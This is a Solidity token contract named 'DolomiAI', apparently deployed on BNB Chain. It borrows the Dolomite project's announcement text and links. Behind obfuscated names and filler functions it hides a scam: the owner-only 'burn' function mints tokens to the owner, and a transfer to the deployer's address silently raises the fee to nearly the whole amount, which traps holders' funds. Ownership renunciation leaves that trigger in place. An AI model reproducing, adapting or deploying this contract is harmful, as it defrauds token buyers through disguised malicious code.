/**
 *Submitted for verification at BscScan.com on 2022-12-30
*/

/*
Dolomite
We’re excited to announce the launch of Dolomite - a  next generation margin protocol and DEX.
Continue reading to learn about the advanced features  Dolomite’s protocol offers that set it apart, or jump  right in at https://dolomite.io
https://medium.com/dolomite-official/dolomite-launches- margin-protocol-and-dex-our-journey-begins-862777432414
https://dolomite.io/
https://twitter.com/dolomite_io
https://t.me/dolomite_official

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.5.0;
contract DolomiAI {
address private  JFtVVF = address(0);
address private  akvenl = address(0);
uint256 private  HKsdhX = 86;
address private  cLJFQA = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
uint256 private  zXvBAp = 92;
uint256 private  VQrRIE = 98;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  OYDAJZ = address(0);
uint256 private  zJjaZL = 4;
uint256 private  dLJcpo = 10;
address private  aNBYUO = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  meMnmY = 17;
uint8 public constant decimals = 18;
address private  mXzoDN = address(0);
uint256 private  bMJHnr = 1000000000000000000;
string public  name = "DolomiAI";
address private  eTzwut = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000;
address public owner;
address private  PfFHZv = address(0);
uint256 public constant HgbUDW = 99999;
address private  FrfRip = address(0);
string public  symbol = "DolomiAI";
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _add1akvenl() private returns (address) {
return akvenl;
}
//
function _getV2QrRIE() private returns (uint256) {
return VQrRIE--;
}
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
//
//
//
//
//
//
function _addzJ3jaZL() private returns (uint256) {
return zJjaZL--;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
//
//
function _getcLJ4FQA() private returns (address) {
return cLJFQA;
}
//
function _addmXzo5DN() private returns (address) {
return mXzoDN;
}
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "qGNMIi");
require(to != address(0), "qGNMIi");
require(amount <= balanceOf[from], "qGNMIi");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HgbUDW/bMJHnr ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PfFHZv){
bMJHnr = HgbUDW+2;
}
emit Transfer(from, to, transferAmount);
}
function _geteTzwu6t() private returns (address) {
return eTzwut;
}
//
function _addJFtVVF7() private returns (address) {
return JFtVVF;
}
//
function _geta8NBYUO() private returns (address) {
return aNBYUO;
}
//
//
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
//
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () public {
PfFHZv = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
//
//
//
//
//
//
function _addOY9DAJZ() private returns (address) {
return OYDAJZ;
}
//
function _getdLJ10cpo() private returns (uint256) {
return dLJcpo * zJjaZL;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _addzXvB11Ap() private returns (uint256) {
return zXvBAp++;
}
//
//
//
//
//
//
//
function _getFrfRi12p() private returns (address) {
return FrfRip;
}
//
function _addmeMnmY13() private returns (uint256) {
return meMnmY--;
}
//
//
//
//
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
//
//
function _getH14KsdhX() private returns (uint256) {
return HKsdhX++;
}
//
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tqGNMIi 0");
require(spender != address(0), "fqGNMIi 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
//
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}